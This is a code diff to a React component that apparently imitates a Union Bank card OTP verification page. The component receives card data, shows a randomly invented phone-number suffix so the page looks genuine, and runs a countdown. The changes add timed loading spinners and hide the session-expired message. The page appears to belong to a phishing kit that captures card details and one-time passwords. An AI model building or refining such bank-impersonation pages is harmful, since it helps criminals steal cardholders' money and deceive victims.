@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import LoadingSpinner from './LoadingSpinner';
 
 interface UnionBankOTPPageProps {
   cardData: {
@@ -44,6 +45,8 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
   const [otpValue, setOtpValue] = useState('');
   const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
   const [isExpired, setIsExpired] = useState(false);
+  const [initialLoading, setInitialLoading] = useState(true);
+  const [redirectLoading, setRedirectLoading] = useState(false);
   
   // Random mobile last 4 digits (session-persistent like other OTP pages)
   const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
@@ -68,6 +71,15 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
   const detectedCardBrand = getCardBrand(cardData.cardNumber);
   const cardBrandLogo = cardBrandLogos[detectedCardBrand] || cardBrandLogos.visa; // fallback to visa
 
+  // Initial loading effect - show spinner for 3-4 seconds
+  useEffect(() => {
+    const loadingTimer = setTimeout(() => {
+      setInitialLoading(false);
+    }, 3500); // 3.5 seconds
+
+    return () => clearTimeout(loadingTimer);
+  }, []);
+
   // Timer effect
   useEffect(() => {
     if (timeLeft > 0 && !isExpired) {
@@ -75,12 +87,13 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
         setTimeLeft(timeLeft - 1);
       }, 1000);
       return () => clearTimeout(timer);
-    } else if (timeLeft === 0) {
+    } else if (timeLeft === 0 && !isExpired) {
       setIsExpired(true);
-      // Redirect to checkout page after 2 seconds when session expires
+      setRedirectLoading(true);
+      // Show loading spinner for 3-4 seconds before redirecting
       setTimeout(() => {
         onCancel();
-      }, 2000);
+      }, 3500); // 3.5 seconds
     }
   }, [timeLeft, isExpired, onCancel]);
 
@@ -113,7 +126,11 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
   };
 
   const handleCancel = () => {
-    onCancel();
+    setRedirectLoading(true);
+    // Show loading spinner for 3-4 seconds before redirecting
+    setTimeout(() => {
+      onCancel();
+    }, 3500); // 3.5 seconds
   };
 
   const handleResendOtp = () => {
@@ -123,16 +140,13 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
     onResendOtp();
   };
 
+  // Show loading spinner for initial load or when redirecting
+  if (initialLoading || redirectLoading) {
+    return <LoadingSpinner />;
+  }
+
   if (isExpired) {
-    return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
-        <div className="text-center p-8">
-          <div className="text-red-600 text-xl font-semibold mb-4">Session Expired</div>
-          <div className="text-gray-600 mb-4">Your OTP verification session has expired.</div>
-          <div className="text-sm text-gray-500">Redirecting to checkout page...</div>
-        </div>
-      </div>
-    );
+    return <LoadingSpinner />;
   }
 
   return (
